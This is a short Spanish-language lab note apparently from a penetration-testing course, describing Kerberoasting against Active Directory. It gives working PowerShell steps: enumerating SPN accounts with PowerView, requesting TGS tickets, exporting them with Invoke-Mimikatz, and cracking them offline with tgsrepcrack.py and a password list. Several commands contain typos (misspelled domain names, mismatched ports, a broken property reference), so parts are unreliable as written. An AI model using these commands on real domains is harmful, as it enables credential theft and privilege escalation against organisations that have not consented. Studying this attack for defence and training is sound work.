
Se trata de un ataque de post-explotation que intenta obtener un hash de contraseña de una cuenta de Active Directory que tenga el "Service Principal Name" (SPN). 

Tareas a realizar:

1. Identificar cuentas con el SPN activo.
2. Pedir TGS tickets para el SPN usando Kerberos.
3. Crackear la password del TGS ticket usando Tgsrepack.

Ejemplo práctico:

```PowerShell
cd C:\tools
. .\PowerView.ps1

#Conseguir usuarios con SPN
Get-NetUser | Where-Object {$.servicePrincipalName} | fl
```

Se puede observar como el usuario stephen nos aparece en la búsqueda:

![[Pasted image 20250331090212.png]]

El siguiente paso sería hacer una petición por un TGS ticket a Kerberos.

```PowerShell
#Conseguir los SPN lanzados:
setspn -T reserach -Q */*

#Pasar a la solicitud del TGS
Add-Type -AssemblyName System.IdentityModel
#Importante sustituir el valor entre comillas por el ticket a solicitar
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ops/researh.security.local:1434"
```

![[Pasted image 20250331090857.png]]

```powershell
#Listar los tickets de Kerberos y exportarlos
. .\Invoke-Mimikatz.ps1
Invoke-Mimikatz -Command '"kerberos::list /export"'

python.exe .\kerberoast-Python3\tgsrepcrack.py .\10k-worst-pass.txt .\1-40a1000-student@ops~research.security.local~1424-RESEARCH.SECURITY.LOCAL.kirbi
```

![[Pasted image 20250331091333.png]]



